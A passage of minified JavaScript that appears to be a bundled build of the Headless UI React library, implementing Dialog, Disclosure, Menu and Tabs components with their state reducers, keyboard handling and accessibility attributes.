            dialogState: a
        }, o] = Jr("Dialog.Panel"),
        i = q(t, o.panelRef),
        s = p.useMemo(() => ({
            open: a === 0
        }), [a]),
        u = _(d => {
            d.stopPropagation()
        });
    return G({
        ourProps: {
            ref: i,
            id: r,
            onClick: u
        },
        theirProps: l,
        slot: s,
        defaultTag: y0,
        name: "Dialog.Panel"
    })
}
let x0 = "h2";

function k0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-dialog-title-${n}`,
            ...l
        } = e,
        [{
            dialogState: a,
            setTitleId: o
        }] = Jr("Dialog.Title"),
        i = q(t);
    p.useEffect(() => (o(r), () => o(null)), [r, o]);
    let s = p.useMemo(() => ({
        open: a === 0
    }), [a]);
    return G({
        ourProps: {
            ref: i,
            id: r
        },
        theirProps: l,
        slot: s,
        defaultTag: x0,
        name: "Dialog.Title"
    })
}
let b0 = K(p0),
    S0 = K(g0),
    E0 = K(w0),
    N0 = K(h0),
    C0 = K(k0),
    Fe = Object.assign(b0, {
        Backdrop: S0,
        Panel: E0,
        Overlay: N0,
        Title: C0,
        Description: a0
    });
var $u;
let P0 = ($u = $.startTransition) != null ? $u : function(e) {
    e()
};
var T0 = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(T0 || {}),
    j0 = (e => (e[e.ToggleDisclosure = 0] = "ToggleDisclosure", e[e.CloseDisclosure = 1] = "CloseDisclosure", e[e.SetButtonId = 2] = "SetButtonId", e[e.SetPanelId = 3] = "SetPanelId", e[e.LinkPanel = 4] = "LinkPanel", e[e.UnlinkPanel = 5] = "UnlinkPanel", e))(j0 || {});
let L0 = {
        0: e => ({ ...e,
            disclosureState: H(e.disclosureState, {
                0: 1,
                1: 0
            })
        }),
        1: e => e.disclosureState === 1 ? e : { ...e,
            disclosureState: 1
        },
        4(e) {
            return e.linkedPanel === !0 ? e : { ...e,
                linkedPanel: !0
            }
        },
        5(e) {
            return e.linkedPanel === !1 ? e : { ...e,
                linkedPanel: !1
            }
        },
        2(e, t) {
            return e.buttonId === t.buttonId ? e : { ...e,
                buttonId: t.buttonId
            }
        },
        3(e, t) {
            return e.panelId === t.panelId ? e : { ...e,
                panelId: t.panelId
            }
        }
    },
    ss = p.createContext(null);
ss.displayName = "DisclosureContext";

function us(e) {
    let t = p.useContext(ss);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Disclosure /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, us), n
    }
    return t
}
let cs = p.createContext(null);
cs.displayName = "DisclosureAPIContext";

function mf(e) {
    let t = p.useContext(cs);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Disclosure /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, mf), n
    }
    return t
}
let ds = p.createContext(null);
ds.displayName = "DisclosurePanelContext";

function $0() {
    return p.useContext(ds)
}

function _0(e, t) {
    return H(t.type, L0, e, t)
}
let R0 = p.Fragment;

function F0(e, t) {
    let {
        defaultOpen: n = !1,
        ...r
    } = e, l = p.useRef(null), a = q(t, tf(b => {
        l.current = b
    }, e.as === void 0 || e.as === p.Fragment)), o = p.useRef(null), i = p.useRef(null), s = p.useReducer(_0, {
        disclosureState: n ? 0 : 1,
        linkedPanel: !1,
        buttonRef: i,
        panelRef: o,
        buttonId: null,
        panelId: null
    }), [{
        disclosureState: u,
        buttonId: d
    }, h] = s, v = _(b => {
        h({
            type: 1
        });
        let f = Xn(l);
        if (!f || !d) return;
        let c = b ? b instanceof HTMLElement ? b : b.current instanceof HTMLElement ? b.current : f.getElementById(d) : f.getElementById(d);
        c == null || c.focus()
    }), y = p.useMemo(() => ({
        close: v
    }), [v]), w = p.useMemo(() => ({
        open: u === 0,
        close: v
    }), [u, v]), x = {
        ref: a
    };
    return $.createElement(ss.Provider, {
        value: s
    }, $.createElement(cs.Provider, {
        value: y
    }, $.createElement(as, {
        value: H(u, {
            0: re.Open,
            1: re.Closed
        })
    }, G({
        ourProps: x,
        theirProps: r,
        slot: w,
        defaultTag: R0,
        name: "Disclosure"
    }))))
}
let I0 = "button";

function D0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-disclosure-button-${n}`,
            ...l
        } = e,
        [a, o] = us("Disclosure.Button"),
        i = $0(),
        s = i === null ? !1 : i === a.panelId,
        u = p.useRef(null),
        d = q(u, t, s ? null : a.buttonRef),
        h = nf();
    p.useEffect(() => {
        if (!s) return o({
            type: 2,
            buttonId: r
        }), () => {
            o({
                type: 2,
                buttonId: null
            })
        }
    }, [r, o, s]);
    let v = _(c => {
            var m;
            if (s) {
                if (a.disclosureState === 1) return;
                switch (c.key) {
                    case M.Space:
                    case M.Enter:
                        c.preventDefault(), c.stopPropagation(), o({
                            type: 0
                        }), (m = a.buttonRef.current) == null || m.focus();
                        break
                }
            } else switch (c.key) {
                case M.Space:
                case M.Enter:
                    c.preventDefault(), c.stopPropagation(), o({
                        type: 0
                    });
                    break
            }
        }),
        y = _(c => {
            switch (c.key) {
                case M.Space:
                    c.preventDefault();
                    break
            }
        }),
        w = _(c => {
            var m;
            os(c.currentTarget) || e.disabled || (s ? (o({
                type: 0
            }), (m = a.buttonRef.current) == null || m.focus()) : o({
                type: 0
            }))
        }),
        x = p.useMemo(() => ({
            open: a.disclosureState === 0
        }), [a]),
        b = ns(e, u),
        f = s ? {
            ref: d,
            type: b,
            onKeyDown: v,
            onClick: w
        } : {
            ref: d,
            id: r,
            type: b,
            "aria-expanded": a.disclosureState === 0,
            "aria-controls": a.linkedPanel ? a.panelId : void 0,
            onKeyDown: v,
            onKeyUp: y,
            onClick: w
        };
    return G({
        mergeRefs: h,
        ourProps: f,
        theirProps: l,
        slot: x,
        defaultTag: I0,
        name: "Disclosure.Button"
    })
}
let M0 = "div",
    O0 = dt.RenderStrategy | dt.Static;

function z0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-disclosure-panel-${n}`,
            ...l
        } = e,
        [a, o] = us("Disclosure.Panel"),
        {
            close: i
        } = mf("Disclosure.Panel"),
        s = nf(),
        u = q(t, a.panelRef, w => {
            P0(() => o({
                type: w ? 4 : 5
            }))
        });
    p.useEffect(() => (o({
        type: 3,
        panelId: r
    }), () => {
        o({
            type: 3,
            panelId: null
        })
    }), [r, o]);
    let d = Zr(),
        h = d !== null ? (d & re.Open) === re.Open : a.disclosureState === 0,
        v = p.useMemo(() => ({
            open: a.disclosureState === 0,
            close: i
        }), [a, i]),
        y = {
            ref: u,
            id: r
        };
    return $.createElement(ds.Provider, {
        value: a.panelId
    }, G({
        mergeRefs: s,
        ourProps: y,
        theirProps: l,
        slot: v,
        defaultTag: M0,
        features: O0,
        visible: h,
        name: "Disclosure.Panel"
    }))
}
let A0 = K(F0),
    W0 = K(D0),
    U0 = K(z0),
    to = Object.assign(A0, {
        Button: W0,
        Panel: U0
    }),
    _u = /([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g;

function Ru(e) {
    var t, n;
    let r = (t = e.innerText) != null ? t : "",
        l = e.cloneNode(!0);
    if (!(l instanceof HTMLElement)) return r;
    let a = !1;
    for (let i of l.querySelectorAll('[hidden],[aria-hidden],[role="img"]')) i.remove(), a = !0;
    let o = a ? (n = l.innerText) != null ? n : "" : r;
    return _u.test(o) && (o = o.replace(_u, "")), o
}

function B0(e) {
    let t = e.getAttribute("aria-label");
    if (typeof t == "string") return t.trim();
    let n = e.getAttribute("aria-labelledby");
    if (n) {
        let r = n.split(" ").map(l => {
            let a = document.getElementById(l);
            if (a) {
                let o = a.getAttribute("aria-label");
                return typeof o == "string" ? o.trim() : Ru(a).trim()
            }
            return null
        }).filter(Boolean);
        if (r.length > 0) return r.join(", ")
    }
    return Ru(e).trim()
}

function H0(e) {
    let t = p.useRef(""),
        n = p.useRef("");
    return _(() => {
        let r = e.current;
        if (!r) return "";
        let l = r.innerText;
        if (t.current === l) return n.current;
        let a = B0(r).trim().toLowerCase();
        return t.current = l, n.current = a, a
    })
}
var V0 = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(V0 || {}),
    Q0 = (e => (e[e.Pointer = 0] = "Pointer", e[e.Other = 1] = "Other", e))(Q0 || {}),
    K0 = (e => (e[e.OpenMenu = 0] = "OpenMenu", e[e.CloseMenu = 1] = "CloseMenu", e[e.GoToItem = 2] = "GoToItem", e[e.Search = 3] = "Search", e[e.ClearSearch = 4] = "ClearSearch", e[e.RegisterItem = 5] = "RegisterItem", e[e.UnregisterItem = 6] = "UnregisterItem", e))(K0 || {});

function no(e, t = n => n) {
    let n = e.activeItemIndex !== null ? e.items[e.activeItemIndex] : null,
        r = ln(t(e.items.slice()), a => a.dataRef.current.domRef.current),
        l = n ? r.indexOf(n) : null;
    return l === -1 && (l = null), {
        items: r,
        activeItemIndex: l
    }
}
let Y0 = {
        1(e) {
            return e.menuState === 1 ? e : { ...e,
                activeItemIndex: null,
                menuState: 1
            }
        },
        0(e) {
            return e.menuState === 0 ? e : { ...e,
                __demoMode: !1,
                menuState: 0
            }
        },
        2: (e, t) => {
            var n;
            let r = no(e),
                l = h1(t, {
                    resolveItems: () => r.items,
                    resolveActiveIndex: () => r.activeItemIndex,
                    resolveId: a => a.id,
                    resolveDisabled: a => a.dataRef.current.disabled
                });
            return { ...e,
                ...r,
                searchQuery: "",
                activeItemIndex: l,
                activationTrigger: (n = t.trigger) != null ? n : 1
            }
        },
        3: (e, t) => {
            let n = e.searchQuery !== "" ? 0 : 1,
                r = e.searchQuery + t.value.toLowerCase(),
                l = (e.activeItemIndex !== null ? e.items.slice(e.activeItemIndex + n).concat(e.items.slice(0, e.activeItemIndex + n)) : e.items).find(o => {
                    var i;
                    return ((i = o.dataRef.current.textValue) == null ? void 0 : i.startsWith(r)) && !o.dataRef.current.disabled
                }),
                a = l ? e.items.indexOf(l) : -1;
            return a === -1 || a === e.activeItemIndex ? { ...e,
                searchQuery: r
            } : { ...e,
                searchQuery: r,
                activeItemIndex: a,
                activationTrigger: 1
            }
        },
        4(e) {
            return e.searchQuery === "" ? e : { ...e,
                searchQuery: "",
                searchActiveItemIndex: null
            }
        },
        5: (e, t) => {
            let n = no(e, r => [...r, {
                id: t.id,
                dataRef: t.dataRef
            }]);
            return { ...e,
                ...n
            }
        },
        6: (e, t) => {
            let n = no(e, r => {
                let l = r.findIndex(a => a.id === t.id);
                return l !== -1 && r.splice(l, 1), r
            });
            return { ...e,
                ...n,
                activationTrigger: 1
            }
        }
    },
    fs = p.createContext(null);
fs.displayName = "MenuContext";

function ka(e) {
    let t = p.useContext(fs);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Menu /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, ka), n
    }
    return t
}

function G0(e, t) {
    return H(t.type, Y0, e, t)
}
let X0 = p.Fragment;

function Z0(e, t) {
    let {
        __demoMode: n = !1,
        ...r
    } = e, l = p.useReducer(G0, {
        __demoMode: n,
        menuState: n ? 0 : 1,
        buttonRef: p.createRef(),
        itemsRef: p.createRef(),
        items: [],
        searchQuery: "",
        activeItemIndex: null,
        activationTrigger: 1
    }), [{
        menuState: a,
        itemsRef: o,
        buttonRef: i
    }, s] = l, u = q(t);
    qd([i, o], (y, w) => {
        var x;
        s({
            type: 1
        }), ts(w, es.Loose) || (y.preventDefault(), (x = i.current) == null || x.focus())
    }, a === 0);
    let d = _(() => {
            s({
                type: 1
            })
        }),
        h = p.useMemo(() => ({
            open: a === 0,
            close: d
        }), [a, d]),
        v = {
            ref: u
        };
    return $.createElement(fs.Provider, {
        value: l
    }, $.createElement(as, {
        value: H(a, {
            0: re.Open,
            1: re.Closed
        })
    }, G({
        ourProps: v,
        theirProps: r,
        slot: h,
        defaultTag: X0,
        name: "Menu"
    })))
}
let J0 = "button";

function q0(e, t) {
    var n;
    let r = Oe(),
        {
            id: l = `headlessui-menu-button-${r}`,
            ...a
        } = e,
        [o, i] = ka("Menu.Button"),
        s = q(o.buttonRef, t),
        u = Xr(),
        d = _(x => {
            switch (x.key) {
                case M.Space:
                case M.Enter:
                case M.ArrowDown:
                    x.preventDefault(), x.stopPropagation(), i({
                        type: 0
                    }), u.nextFrame(() => i({
                        type: 2,
                        focus: tt.First
                    }));
                    break;
                case M.ArrowUp:
                    x.preventDefault(), x.stopPropagation(), i({
                        type: 0
                    }), u.nextFrame(() => i({
                        type: 2,
                        focus: tt.Last
                    }));
                    break
            }
        }),
        h = _(x => {
            switch (x.key) {
                case M.Space:
                    x.preventDefault();
                    break
            }
        }),
        v = _(x => {
            if (os(x.currentTarget)) return x.preventDefault();
            e.disabled || (o.menuState === 0 ? (i({
                type: 1
            }), u.nextFrame(() => {
                var b;
                return (b = o.buttonRef.current) == null ? void 0 : b.focus({
                    preventScroll: !0
                })
            })) : (x.preventDefault(), i({
                type: 0
            })))
        }),
        y = p.useMemo(() => ({
            open: o.menuState === 0
        }), [o]),
        w = {
            ref: s,
            id: l,
            type: ns(e, o.buttonRef),
            "aria-haspopup": "menu",
            "aria-controls": (n = o.itemsRef.current) == null ? void 0 : n.id,
            "aria-expanded": o.menuState === 0,
            onKeyDown: d,
            onKeyUp: h,
            onClick: v
        };
    return G({
        ourProps: w,
        theirProps: a,
        slot: y,
        defaultTag: J0,
        name: "Menu.Button"
    })
}
let eh = "div",
    th = dt.RenderStrategy | dt.Static;

function nh(e, t) {
    var n, r;
    let l = Oe(),
        {
            id: a = `headlessui-menu-items-${l}`,
            ...o
        } = e,
        [i, s] = ka("Menu.Items"),
        u = q(i.itemsRef, t),
        d = Zn(i.itemsRef),
        h = Xr(),
        v = Zr(),
        y = v !== null ? (v & re.Open) === re.Open : i.menuState === 0;
    p.useEffect(() => {
        let c = i.itemsRef.current;
        c && i.menuState === 0 && c !== (d == null ? void 0 : d.activeElement) && c.focus({
            preventScroll: !0
        })
    }, [i.menuState, i.itemsRef, d]), s1({
        container: i.itemsRef.current,
        enabled: i.menuState === 0,
        accept(c) {
            return c.getAttribute("role") === "menuitem" ? NodeFilter.FILTER_REJECT : c.hasAttribute("role") ? NodeFilter.FILTER_SKIP : NodeFilter.FILTER_ACCEPT
        },
        walk(c) {
            c.setAttribute("role", "none")
        }
    });
    let w = _(c => {
            var m, k;
            switch (h.dispose(), c.key) {
                case M.Space:
                    if (i.searchQuery !== "") return c.preventDefault(), c.stopPropagation(), s({
                        type: 3,
                        value: c.key
                    });
                case M.Enter:
                    if (c.preventDefault(), c.stopPropagation(), s({
                            type: 1
                        }), i.activeItemIndex !== null) {
                        let {
                            dataRef: S
                        } = i.items[i.activeItemIndex];
                        (k = (m = S.current) == null ? void 0 : m.domRef.current) == null || k.click()
                    }
                    Xd(i.buttonRef.current);
                    break;
                case M.ArrowDown:
                    return c.preventDefault(), c.stopPropagation(), s({
                        type: 2,
                        focus: tt.Next
                    });
                case M.ArrowUp:
                    return c.preventDefault(), c.stopPropagation(), s({
                        type: 2,
                        focus: tt.Previous
                    });
                case M.Home:
                case M.PageUp:
                    return c.preventDefault(), c.stopPropagation(), s({
                        type: 2,
                        focus: tt.First
                    });
                case M.End:
                case M.PageDown:
                    return c.preventDefault(), c.stopPropagation(), s({
                        type: 2,
                        focus: tt.Last
                    });
                case M.Escape:
                    c.preventDefault(), c.stopPropagation(), s({
                        type: 1
                    }), at().nextFrame(() => {
                        var S;
                        return (S = i.buttonRef.current) == null ? void 0 : S.focus({
                            preventScroll: !0
                        })
                    });
                    break;
                case M.Tab:
                    c.preventDefault(), c.stopPropagation(), s({
                        type: 1
                    }), at().nextFrame(() => {
                        l1(i.buttonRef.current, c.shiftKey ? oe.Previous : oe.Next)
                    });
                    break;
                default:
                    c.key.length === 1 && (s({
                        type: 3,
                        value: c.key
                    }), h.setTimeout(() => s({
                        type: 4
                    }), 350));
                    break
            }
        }),
        x = _(c => {
            switch (c.key) {
                case M.Space:
                    c.preventDefault();
                    break
            }
        }),
        b = p.useMemo(() => ({
            open: i.menuState === 0
        }), [i]),
        f = {
            "aria-activedescendant": i.activeItemIndex === null || (n = i.items[i.activeItemIndex]) == null ? void 0 : n.id,
            "aria-labelledby": (r = i.buttonRef.current) == null ? void 0 : r.id,
            id: a,
            onKeyDown: w,
            onKeyUp: x,
            role: "menu",
            tabIndex: 0,
            ref: u
        };
    return G({
        ourProps: f,
        theirProps: o,
        slot: b,
        defaultTag: eh,
        features: th,
        visible: y,
        name: "Menu.Items"
    })
}
let rh = p.Fragment;

function lh(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-menu-item-${n}`,
            disabled: l = !1,
            ...a
        } = e,
        [o, i] = ka("Menu.Item"),
        s = o.activeItemIndex !== null ? o.items[o.activeItemIndex].id === r : !1,
        u = p.useRef(null),
        d = q(t, u);
    te(() => {
        if (o.__demoMode || o.menuState !== 0 || !s || o.activationTrigger === 0) return;
        let S = at();
        return S.requestAnimationFrame(() => {
            var N, P;
            (P = (N = u.current) == null ? void 0 : N.scrollIntoView) == null || P.call(N, {
                block: "nearest"
            })
        }), S.dispose
    }, [o.__demoMode, u, s, o.menuState, o.activationTrigger, o.activeItemIndex]);
    let h = H0(u),
        v = p.useRef({
            disabled: l,
            domRef: u,
            get textValue() {
                return h()
            }
        });
    te(() => {
        v.current.disabled = l
    }, [v, l]), te(() => (i({
        type: 5,
        id: r,
        dataRef: v
    }), () => i({
        type: 6,
        id: r
    })), [v, r]);
    let y = _(() => {
            i({
                type: 1
            })
        }),
        w = _(S => {
            if (l) return S.preventDefault();
            i({
                type: 1
            }), Xd(o.buttonRef.current)
        }),
        x = _(() => {
            if (l) return i({
                type: 2,
                focus: tt.Nothing
            });
            i({
                type: 2,
                focus: tt.Specific,
                id: r
            })
        }),
        b = i1(),
        f = _(S => b.update(S)),
        c = _(S => {
            b.wasMoved(S) && (l || s || i({
                type: 2,
                focus: tt.Specific,
                id: r,
                trigger: 0
            }))
        }),
        m = _(S => {
            b.wasMoved(S) && (l || s && i({
                type: 2,
                focus: tt.Nothing
            }))
        }),
        k = p.useMemo(() => ({
            active: s,
            disabled: l,
            close: y
        }), [s, l, y]);
    return G({
        ourProps: {
            id: r,
            ref: d,
            role: "menuitem",
            tabIndex: l === !0 ? void 0 : -1,
            "aria-disabled": l === !0 ? !0 : void 0,
            disabled: void 0,
            onClick: w,
            onFocus: x,
            onPointerEnter: f,
            onMouseEnter: f,
            onPointerMove: c,
            onMouseMove: c,
            onPointerLeave: m,
            onMouseLeave: m
        },
        theirProps: a,
        slot: k,
        defaultTag: rh,
        name: "Menu.Item"
    })
}
let ah = K(Z0),
    oh = K(q0),
    ih = K(nh),
    sh = K(lh),
    ur = Object.assign(ah, {
        Button: oh,
        Items: ih,
        Item: sh
    });

function uh(e = 0) {
    let [t, n] = p.useState(e), r = Jn(), l = p.useCallback(s => {
        r.current && n(u => u | s)
    }, [t, r]), a = p.useCallback(s => !!(t & s), [t]), o = p.useCallback(s => {
        r.current && n(u => u & ~s)
    }, [n, r]), i = p.useCallback(s => {
        r.current && n(u => u ^ s)
    }, [n]);
    return {
        flags: t,
        addFlag: l,
        hasFlag: a,
        removeFlag: o,
        toggleFlag: i
    }
}

function ch({
    onFocus: e
}) {
    let [t, n] = p.useState(!0), r = Jn();
    return t ? $.createElement(Br, {
        as: "button",
        type: "button",
        features: Ur.Focusable,
        onFocus: l => {
            l.preventDefault();
            let a, o = 50;

            function i() {
                if (o-- <= 0) {
                    a && cancelAnimationFrame(a);
                    return
                }
                if (e()) {
                    if (cancelAnimationFrame(a), !r.current) return;
                    n(!1);
                    return
                }
                a = requestAnimationFrame(i)
            }
            a = requestAnimationFrame(i)
        }
    }) : null
}
const hf = p.createContext(null);

function dh() {
    return {
        groups: new Map,
        get(e, t) {
            var n;
            let r = this.groups.get(e);
            r || (r = new Map, this.groups.set(e, r));
            let l = (n = r.get(t)) != null ? n : 0;
            r.set(t, l + 1);
            let a = Array.from(r.keys()).indexOf(t);

            function o() {
                let i = r.get(t);
                i > 1 ? r.set(t, i - 1) : r.delete(t)
            }
            return [a, o]
        }
    }
}

function fh({
    children: e
}) {
    let t = p.useRef(dh());
    return p.createElement(hf.Provider, {
        value: t
    }, e)
}

function vf(e) {
    let t = p.useContext(hf);
    if (!t) throw new Error("You must wrap your component in a <StableCollection>");
    let n = ph(),
        [r, l] = t.current.get(e, n);
    return p.useEffect(() => l, []), r
}

function ph() {
    var e, t, n;
    let r = (n = (t = (e = p.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) == null ? void 0 : e.ReactCurrentOwner) == null ? void 0 : t.current) != null ? n : null;
    if (!r) return Symbol();
    let l = [],
        a = r;
    for (; a;) l.push(a.index), a = a.return;
    return "$." + l.join(".")
}
var mh = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(mh || {}),
    hh = (e => (e[e.Less = -1] = "Less", e[e.Equal = 0] = "Equal", e[e.Greater = 1] = "Greater", e))(hh || {}),
    vh = (e => (e[e.SetSelectedIndex = 0] = "SetSelectedIndex", e[e.RegisterTab = 1] = "RegisterTab", e[e.UnregisterTab = 2] = "UnregisterTab", e[e.RegisterPanel = 3] = "RegisterPanel", e[e.UnregisterPanel = 4] = "UnregisterPanel", e))(vh || {});
let gh = {
        0(e, t) {
            var n;
            let r = ln(e.tabs, d => d.current),
                l = ln(e.panels, d => d.current),
                a = r.filter(d => {
                    var h;
                    return !((h = d.current) != null && h.hasAttribute("disabled"))
                }),
                o = { ...e,
                    tabs: r,
                    panels: l
                };
            if (t.index < 0 || t.index > r.length - 1) {
                let d = H(Math.sign(t.index - e.selectedIndex), {
                    [-1]: () => 1,
                    0: () => H(Math.sign(t.index), {
                        [-1]: () => 0,
                        0: () => 0,
                        1: () => 1
                    }),
                    1: () => 0
                });
                if (a.length === 0) return o;
                let h = H(d, {
                    0: () => r.indexOf(a[0]),
                    1: () => r.indexOf(a[a.length - 1])
                });
                return { ...o,
                    selectedIndex: h === -1 ? e.selectedIndex : h
                }
            }
            let i = r.slice(0, t.index),
                s = [...r.slice(t.index), ...i].find(d => a.includes(d));
            if (!s) return o;
            let u = (n = r.indexOf(s)) != null ? n : e.selectedIndex;
            return u === -1 && (u = e.selectedIndex), { ...o,
                selectedIndex: u
            }
        },
        1(e, t) {
            var n;
            if (e.tabs.includes(t.tab)) return e;
            let r = e.tabs[e.selectedIndex],
                l = ln([...e.tabs, t.tab], o => o.current),
                a = (n = l.indexOf(r)) != null ? n : e.selectedIndex;
            return a === -1 && (a = e.selectedIndex), { ...e,
                tabs: l,
                selectedIndex: a
            }
        },
        2(e, t) {
            return { ...e,
                tabs: e.tabs.filter(n => n !== t.tab)
            }
        },
        3(e, t) {
            return e.panels.includes(t.panel) ? e : { ...e,
                panels: ln([...e.panels, t.panel], n => n.current)
            }
        },
        4(e, t) {
            return { ...e,
                panels: e.panels.filter(n => n !== t.panel)
            }
        }
    },
    ps = p.createContext(null);
ps.displayName = "TabsDataContext";

function Vn(e) {
    let t = p.useContext(ps);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, Vn), n
    }
    return t
}
let ms = p.createContext(null);
ms.displayName = "TabsActionsContext";

function hs(e) {
    let t = p.useContext(ms);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, hs), n
    }
    return t
}

function yh(e, t) {
    return H(t.type, gh, e, t)
}
let wh = p.Fragment;

function xh(e, t) {
    let {
        defaultIndex: n = 0,
        vertical: r = !1,
        manual: l = !1,
        onChange: a,
        selectedIndex: o = null,
        ...i
    } = e;
    const s = r ? "vertical" : "horizontal",
        u = l ? "manual" : "auto";
    let d = o !== null,
        h = q(t),
        [v, y] = p.useReducer(yh, {
            selectedIndex: o ?? n,
            tabs: [],
            panels: []
        }),
        w = p.useMemo(() => ({
            selectedIndex: v.selectedIndex
        }), [v.selectedIndex]),
        x = He(a || (() => {})),
        b = He(v.tabs),
        f = p.useMemo(() => ({
            orientation: s,
            activation: u,
            ...v
        }), [s, u, v]),
        c = _(C => (y({
            type: 1,
            tab: C
        }), () => y({
            type: 2,
            tab: C
        }))),
        m = _(C => (y({
            type: 3,
            panel: C
        }), () => y({
            type: 4,
            panel: C
        }))),
        k = _(C => {
            S.current !== C && x.current(C), d || y({
                type: 0,
                index: C
            })
        }),
        S = He(d ? e.selectedIndex : v.selectedIndex),
        N = p.useMemo(() => ({
            registerTab: c,
            registerPanel: m,
            change: k
        }), []);
    te(() => {
        y({
            type: 0,
            index: o ?? n
        })
    }, [o]), te(() => {
        if (S.current === void 0 || v.tabs.length <= 0) return;
        let C = ln(v.tabs, I => I.current);
        C.some((I, T) => v.tabs[T] !== I) && k(C.indexOf(v.tabs[S.current]))
    });
    let P = {
        ref: h
    };
    return $.createElement(fh, null, $.createElement(ms.Provider, {
        value: N
    }, $.createElement(ps.Provider, {
        value: f
    }, f.tabs.length <= 0 && $.createElement(ch, {
        onFocus: () => {
            var C, I;
            for (let T of b.current)
                if (((C = T.current) == null ? void 0 : C.tabIndex) === 0) return (I = T.current) == null || I.focus(), !0;
            return !1
        }
    }), G({
        ourProps: P,
        theirProps: i,
        slot: w,
        defaultTag: wh,
        name: "Tabs"
    }))))
}
let kh = "div";

function bh(e, t) {
    let {
        orientation: n,
        selectedIndex: r
    } = Vn("Tab.List"), l = q(t);
    return G({
        ourProps: {
            ref: l,
            role: "tablist",
            "aria-orientation": n
        },
        theirProps: e,
        slot: {
            selectedIndex: r
        },
        defaultTag: kh,
        name: "Tabs.List"
    })
}
let Sh = "button";

function Eh(e, t) {
    var n, r;
    let l = Oe(),
        {
            id: a = `headlessui-tabs-tab-${l}`,
            ...o
        } = e,
        {
            orientation: i,
            activation: s,
            selectedIndex: u,
            tabs: d,
            panels: h
        } = Vn("Tab"),
        v = hs("Tab"),
        y = Vn("Tab"),
        w = p.useRef(null),
        x = q(w, t);
    te(() => v.registerTab(w), [v, w]);
    let b = vf("tabs"),
        f = d.indexOf(w);
    f === -1 && (f = b);
    let c = f === u,
        m = _(T => {
            var A;
            let fe = T();
            if (fe === Ln.Success && s === "auto") {
                let Le = (A = Xn(w)) == null ? void 0 : A.activeElement,
                    Ke = y.tabs.findIndex(Ye => Ye.current === Le);
                Ke !== -1 && v.change(Ke)
            }
            return fe
        }),
        k = _(T => {
            let A = d.map(fe => fe.current).filter(Boolean);
            if (T.key === M.Space || T.key === M.Enter) {
                T.preventDefault(), T.stopPropagation(), v.change(f);
                return
            }
            switch (T.key) {
                case M.Home:
                case M.PageUp:
                    return T.preventDefault(), T.stopPropagation(), m(() => et(A, oe.First));
                case M.End:
                case M.PageDown:
                    return T.preventDefault(), T.stopPropagation(), m(() => et(A, oe.Last))
            }
            if (m(() => H(i, {
                    vertical() {
                        return T.key === M.ArrowUp ? et(A, oe.Previous | oe.WrapAround) : T.key === M.ArrowDown ? et(A, oe.Next | oe.WrapAround) : Ln.Error
                    },
                    horizontal() {
                        return T.key === M.ArrowLeft ? et(A, oe.Previous | oe.WrapAround) : T.key === M.ArrowRight ? et(A, oe.Next | oe.WrapAround) : Ln.Error
                    }
                })) === Ln.Success) return T.preventDefault()
        }),
        S = p.useRef(!1),
        N = _(() => {
            var T;
            S.current || (S.current = !0, (T = w.current) == null || T.focus({
                preventScroll: !0
            }), v.change(f), Gr(() => {
                S.current = !1
            }))
        }),
        P = _(T => {
            T.preventDefault()
        }),
        C = p.useMemo(() => ({
            selected: c
        }), [c]),
        I = {
            ref: x,
            onKeyDown: k,
            onMouseDown: P,
            onClick: N,
            id: a,
            role: "tab",
            type: ns(e, w),
            "aria-controls": (r = (n = h[f]) == null ? void 0 : n.current) == null ? void 0 : r.id,
            "aria-selected": c,
            tabIndex: c ? 0 : -1
        };
    return G({
        ourProps: I,
        theirProps: o,
        slot: C,
        defaultTag: Sh,
        name: "Tabs.Tab"
    })
}
let Nh = "div";

function Ch(e, t) {
    let {
        selectedIndex: n
    } = Vn("Tab.Panels"), r = q(t), l = p.useMemo(() => ({
        selectedIndex: n
    }), [n]);
    return G({
        ourProps: {
            ref: r
        },
        theirProps: e,
        slot: l,
        defaultTag: Nh,
        name: "Tabs.Panels"
    })
}
let Ph = "div",
    Th = dt.RenderStrategy | dt.Static;

function jh(e, t) {
    var n, r, l, a;
    let o = Oe(),
        {
            id: i = `headlessui-tabs-panel-${o}`,
            tabIndex: s = 0,
            ...u
        } = e,
        {
            selectedIndex: d,
            tabs: h,
            panels: v
        } = Vn("Tab.Panel"),
        y = hs("Tab.Panel"),
        w = p.useRef(null),
        x = q(w, t);
    te(() => y.registerPanel(w), [y, w]);
    let b = vf("panels"),
        f = v.indexOf(w);
    f === -1 && (f = b);
    let c = f === d,
        m = p.useMemo(() => ({
            selected: c
        }), [c]),
        k = {
            ref: x,
            id: i,
            role: "tabpanel",
            "aria-labelledby": (r = (n = h[f]) == null ? void 0 : n.current) == null ? void 0 : r.id,
            tabIndex: c ? s : -1
        };
    return !c && ((l = u.unmount) == null || l) && !((a = u.static) != null && a) ? $.createElement(Br, {
        as: "span",
        "aria-hidden": "true",
        ...k
    }) : G({
        ourProps: k,
        theirProps: u,
        slot: m,
        defaultTag: Ph,
        features: Th,
        visible: c,
        name: "Tabs.Panel"
    })
}
let Lh = K(Eh),
    $h = K(xh),
    _h = K(bh),
    Rh = K(Ch),
    Fh = K(jh),
    Jt = Object.assign(Lh, {
        Group: $h,
        List: _h,
        Panels: Rh,
        Panel: Fh
    });

function Ih(e) {
    let t = {
        called: !1
    };
    return (...n) => {
